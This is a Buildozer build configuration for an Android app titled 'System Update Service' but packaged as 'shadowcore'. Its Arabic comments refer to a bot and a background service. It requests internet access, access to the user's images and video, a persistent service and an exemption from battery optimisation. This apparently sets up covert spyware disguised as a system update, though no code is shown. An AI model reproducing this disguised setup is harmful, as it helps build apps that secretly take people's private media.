[app]
title = System Update Service
package.name = shadowcore
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.90

# المتطلبات الأساسية لعمل البوت والخدمة
requirements = python3,kivy,requests,urllib3,certifi,idna,chardet,android,pyjnius

orientation = portrait

# الأذونات المطلوبة (الصور، الإشعارات، وتجاوز البطارية)
android.permissions = INTERNET, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, FOREGROUND_SERVICE, WAKE_LOCK, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, POST_NOTIFICATIONS

android.api = 34
android.minapi = 21
android.ndk = 25b
android.private_storage = True

# السطر السحري لربط الخدمة (تأكد من حرف M الكبير)
services = Myservice:service.py

android.archs = arm64-v8a
android.copy_libs = 1

[buildozer]
log_level = 2
warn_on_root = 1
